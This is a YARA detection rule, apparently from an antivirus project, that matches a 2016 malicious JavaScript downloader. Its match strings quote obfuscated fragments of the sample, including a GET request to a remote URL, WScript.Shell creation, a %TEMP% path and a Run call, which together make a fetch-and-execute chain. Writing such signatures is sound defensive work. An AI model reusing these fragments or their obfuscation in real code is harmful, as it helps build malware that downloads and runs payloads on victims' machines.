rule sig_20160427_fe8e0fc2848ab1a47df1bd2a4332e50a {
  meta:
    description = "datamaliciousorder - file 20160427_fe8e0fc2848ab1a47df1bd2a4332e50a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3a59ae7e94867892964c12cf8effef6430f7a94981828168913eb5e485e4bd80"

  strings:
    $s1  = "UhterAcqac[AlayeKhrth](\"G\" + \"ET\", \"http://myehelpers.com/j3ykf\", false);" fullword ascii
    $s2  = "function SadmqDsudo() {return FxcwlVpjtf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"qkRbnIQ" ascii
    $s3  = "function SadmqDsudo() {return FxcwlVpjtf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"qkRbnIQ" ascii
    $s4  = "var FxcwlVpjtf = function GxvluCddaa() {return RngzkNuwab[LxsidLulhb](\"WScript\"+\".Shell\");}(), KaxiaWvyrm = 11;" fullword ascii
    $s5  = "function MxcnjPvprj(RqwknOnftt, RqshoKwwve){FmmahZjrob = FmmahZjrob * 1; return RqwknOnftt - RqshoKwwve;};" fullword ascii
    $s6  = "var RngzkNuwab = this[\"WScript\"];" fullword ascii
    $s7  = "function BhjryDckzq(){return KqcvwApten + \"\";};" fullword ascii
    $s8  = "if (UhterAcqac[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function NsgolZhtsj() {return ((FdfviDuogc == true) && (FdfviDuogc == AyykfWrzhu)) ? 1 : FmmahZjrob;};" fullword ascii
    $s10 = "return MxcnjPvprj(PqoowOwzzp, VtlkxJfcwk);" fullword ascii
    $s11 = "FdfviDuogc = true; " fullword ascii
    $s12 = "var KaufbWsrxs = new this[\"D\"+\"ate\"]();" fullword ascii
    $s13 = "function TjepnVqwsx(ZnjfoXtdcn) {var VrmaeLhxlt = (1, 2, 3, 4, 5, ZnjfoXtdcn); return VrmaeLhxlt;};" fullword ascii
    $s14 = "var FdfviDuogc = false;" fullword ascii
    $s15 = "function TqdqyUjylh(WcwznQslxd){FxcwlVpjtf[\"R\"+\"un\"](WcwznQslxd, FmmahZjrob, FmmahZjrob);};" fullword ascii
    $s16 = "function UwskhCuvwq(){return 23;};" fullword ascii
    $s17 = "function XoduyTuhws(){return LxsidLulhb;};" fullword ascii
    $s18 = "AyykfWrzhu = true; " fullword ascii
    $s19 = "IjbdlWyjvh = true;" fullword ascii
    $s20 = "}while (AvcwmCuygg);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}